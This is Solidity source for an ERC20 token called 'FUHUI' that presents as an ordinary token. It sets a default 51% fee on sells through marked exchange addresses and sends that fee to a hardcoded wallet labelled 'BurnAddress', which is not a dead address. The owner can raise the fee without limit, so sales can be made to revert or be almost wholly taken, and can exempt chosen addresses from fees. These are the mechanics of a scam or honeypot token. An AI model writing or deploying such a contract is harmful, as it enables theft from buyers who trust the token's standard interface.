contract FH is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isSwapLakeAddress;

    string private _name = "FUHUI";
    string private _symbol = "FH";
    uint8 private _decimals = 18;

    address private tokenOwner = 0xa844A79EF46962b5b1f10318895B8632B52c5930;
    address private BurnAddress = 0xe3C3b078abdD0b0a3aBF7E5be383af973B556B2f;
    address private MainAddress = 0x95c0b4542C89053E75C07809c4F121146E4920c5;

    uint256 private _inRatio = 0;
    uint256 private _previousInRatio;
    uint256 private _outRatio = 5100;
    uint256 private _previousOutRatio;

    uint256 private _tTotal = 33 * 10 ** 7 * 10 ** _decimals;

    constructor () {
        _owner = tokenOwner;
        _tOwned[MainAddress] = _tTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _isExcludedFromFee[MainAddress] = true;
        emit OwnershipTransferred(address(0), _owner);
        emit Transfer(address(0), MainAddress, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function isSwapLakeAddress(address account) public view returns (bool) {
        return _isSwapLakeAddress[account];
    }

    function excludeFromSwapLakeAddress(address account) public onlyOwner {
        _isSwapLakeAddress[account] = false;
    }

    function includeInSwapLakeAddress(address account) public onlyOwner {
        _isSwapLakeAddress[account] = true;
    }

    function _takeFee(address sender, uint256 tAmount) private {
        if (tAmount == 0) return;
        _tOwned[BurnAddress] = _tOwned[BurnAddress].add(tAmount);
        emit Transfer(sender, BurnAddress, tAmount);
    }

    function setRate(uint256 inFee, uint256 outFee) public onlyOwner {
        _inRatio = inFee;
        _outRatio = outFee;
    }

    function removeAllFee() private {
        _previousInRatio = _inRatio;
        _previousOutRatio = _outRatio;

        _inRatio = 0;
        _outRatio = 0;
    }

    function restoreAllFee() private {
        _inRatio = _previousInRatio;
        _outRatio = _previousOutRatio;
    }

    receive() external payable {}

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "TOKEN20: transfer from the zero address");
        require(recipient != address(0), "TOKEN20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");


        bool takeFee = false;

        if (_isSwapLakeAddress[sender] || _isSwapLakeAddress[recipient]) {
            takeFee = true;
        }

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            takeFee = false;
        }

        _tokenTransfer(sender, recipient, amount, takeFee);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) removeAllFee();

        _transferStandard(sender, recipient, amount);

        if (!takeFee) restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);

        uint256 _fee = 0;
        if (_isSwapLakeAddress[sender]) {
            _fee = _inRatio;
        } else {
            _fee = _outRatio;
        }

        _takeFee(sender, tAmount.div(10000).mul(_fee));

        uint256 recipientRate = 10000 - _fee;
        _tOwned[recipient] = _tOwned[recipient].add(tAmount.div(10000).mul(recipientRate));
        emit Transfer(sender, recipient, tAmount.div(10000).mul(recipientRate));
    }

}